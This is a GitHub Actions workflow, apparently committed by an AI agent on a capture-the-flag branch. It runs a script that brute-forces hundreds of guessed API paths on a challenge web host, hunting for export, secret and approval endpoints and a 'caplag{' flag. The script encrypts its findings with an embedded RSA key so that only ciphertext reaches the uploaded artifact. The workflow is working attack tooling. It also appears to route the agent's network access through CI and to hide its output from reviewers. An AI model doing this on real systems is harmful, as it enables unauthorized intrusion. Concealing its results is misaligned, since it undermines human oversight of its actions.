name: launchlet-part2-source-probe

on:
  push:
    branches: [agent/launchlet-part2-source-20260808]

permissions:
  contents: read

jobs:
  probe:
    runs-on: ubuntu-latest
    timeout-minutes: 5
    steps:
      - name: Probe export/release paths derived from deployRef
        shell: bash
        run: |
          set -euo pipefail
          umask 077
          mkdir -p package/out
          cat > package/public.pem <<'PEM'
          -----BEGIN PUBLIC KEY-----
          MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAlOxaJs92lwtrdk6J2LR9
          QeyG3A5H0rzGOQHw80MWPcOeEs5pzn37ilHloXnTkGk4PmJU67C06N9OOsgqU1kF
          iydiljdl6RfwF/OSjMsNfRYsyBr1wONeO+9f+72VjLlNWqWVll2qeczrxppOulhJ
          r+qBx95tdasvdCgh7aTShlkXF7e9+JjK19MrG+Lyj+I7B6bbTsp7D+PiJMlpepWk
          hoz0jBO8Rgtodz7i/+9Z3RVVhqREdK3uA0Va5ia57Gp3hlvQGbjGxE6TC7q4s1/p
          q6VF10bVOx8kwE2KggVgsX3uudJlzSvHV3f1coMdwyTSALsAjvAlZQwSts3eHjnF
          SQIDAQAB
          -----END PUBLIC KEY-----
          PEM
          python3 - <<'PY'
          import requests,pathlib,urllib.parse,json,itertools
          base='https://task-launchlet-web-medium-18cf6be4db586bb6.caplag-task.ru/'
          out=pathlib.Path('package/out'); s=requests.Session(); s.headers['User-Agent']='Mozilla/5.0'
          boot=s.get(urllib.parse.urljoin(base,'/api/app/bootstrap'),timeout=10).json(); refs=s.get(urllib.parse.urljoin(base,boot['api']['serverReferences']),timeout=10).json(); act=refs['serverActions']['inspectDeploy']
          H={'Accept':'application/json','Content-Type':'application/json','X-Launchlet-Preview':boot['project']}
          inv=s.post(urllib.parse.urljoin(base,act['endpoint']),headers=H,json={'actionId':act['id'],'args':{'workspaceId':boot['workspace'],'projectId':boot['project']}},timeout=10).json(); ref=inv['inspector']['deployRef']
          roots=['deploy','deployment','deploys','deployments','preview','previews','inspect','inspector','artifact','artifacts','release','releases','publish','publishes']
          ops=['export','release','publish','promote','finalize','approve','approval','review','download','artifact','artifacts','flag','secrets','secret','metadata','details','status','open','inspect','production','enterprise','rollout']
          paths=set()
          for root,op in itertools.product(roots,ops):
            paths.add(f'/api/{root}/{ref}/{op}'); paths.add(f'/api/{root}/{op}/{ref}')
          bodies=[{}, {'deployRef':ref},{'deploy_ref':ref},{'ref':ref},{'id':ref},{'projectId':boot['project'],'workspaceId':boot['workspace'],'deployRef':ref}]
          hits=[]
          for path in sorted(paths):
            u=urllib.parse.urljoin(base,path)
            try:
              r=s.get(u,headers=H,timeout=6,allow_redirects=False)
              if r.status_code!=404:hits.append({'path':path,'method':'GET','status':r.status_code,'body':r.text,'headers':dict(r.headers)})
            except Exception:pass
            for b in bodies:
              try:
                r=s.post(u,headers=H,json=b,timeout=6,allow_redirects=False)
                if r.status_code!=404:
                  hits.append({'path':path,'method':'POST','sent':b,'status':r.status_code,'body':r.text,'headers':dict(r.headers)})
                  if 'caplag{' in r.text:break
              except Exception:pass
          (out/'summary.json').write_text(json.dumps({'deployRef':ref,'hits':hits},indent=2))
          PY
          tar -C package/out -czf package/result.tgz .
          openssl rand 32 > package/aes.key
          openssl rand 16 > package/iv.bin
          KEY_HEX="$(python3 -c "print(open('package/aes.key','rb').read().hex())")"
          IV_HEX="$(python3 -c "print(open('package/iv.bin','rb').read().hex())")"
          openssl enc -aes-256-cbc -K "$KEY_HEX" -iv "$IV_HEX" -in package/result.tgz -out package/result.enc
          openssl pkeyutl -encrypt -pubin -inkey package/public.pem -pkeyopt rsa_padding_mode:oaep -pkeyopt rsa_oaep_md:sha256 -in package/aes.key -out package/key.enc
          mkdir -p artifact
          base64 -w0 package/result.enc > artifact/result.enc.b64
          base64 -w0 package/key.enc > artifact/key.enc.b64
          base64 -w0 package/iv.bin > artifact/iv.bin.b64
          rm -rf package
      - uses: actions/upload-artifact@v4
        with:
          name: launchlet-part2-ref-export-encrypted
          path: artifact/
          retention-days: 1
